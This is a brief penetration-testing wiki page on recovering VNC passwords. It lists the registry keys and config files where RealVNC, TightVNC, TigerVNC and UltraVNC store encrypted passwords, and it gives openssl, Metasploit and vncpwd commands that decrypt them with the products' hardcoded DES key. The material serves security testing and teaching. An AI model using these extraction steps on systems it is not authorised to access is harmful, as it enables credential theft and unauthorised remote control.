# VNC Config

## Theory

VNC clients uses a hardcoded DES key to store credentials. If you have access to a VNC config file you may be able to decrypt it as **the same key is used across multiple product lines**.

## Practice

{% tabs %}
{% tab title="Windows" %}
On Windows systems, you may find the VNC password in the following files.

| VNC Client   | Config File                                     | Password                                      |
| ------------ | ----------------------------------------------- | --------------------------------------------- |
| _RealVNC_    | HKEY\_LOCAL\_MACHINE\SOFTWARE\RealVNC\vncserver | Value: Password                               |
| _TightVNC_   | HKEY\_CURRENT\_USER\Software\TightVNC\Server    | HKLM\SOFTWARE\TightVNC\Server\ControlPassword |
| tightvnc.ini | vnc\_viewer.ini                                 | Value: Password or PasswordViewOnly           |
| _TigerVNC_   | HKEY\_LOCAL\_USER\Software\TigerVNC\WinVNC4     | Value: Password                               |
| _UltraVNC_   | C:\Program Files\UltraVNC\ultravnc.ini          | Value: passwd or passwd2                      |

Once you have extracted the hexadecimal-encoded password, we can decrypt it using only native Linux tools

```bash
echo -n <HEX_PASSWORD> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

Msfconsole can also be used to decrypt the password as follows (example with key 17526b06234e5807)

```bash
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
 => "Secure!\x00"
>> 
```
{% endtab %}

{% tab title="UNIX-like" %}
On UNIX-type systems, the default password is stored in: `~/.vnc/passwd`

We may decrypt it using the [vncpwd](https://github.com/jeroennijhof/vncpwd) tool

```bash
vncpwd <vnc password file>
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://notes.offsec-journey.com/enumeration/vnc" %}

{% embed url="https://github.com/frizb/PasswordDecrypts" %}
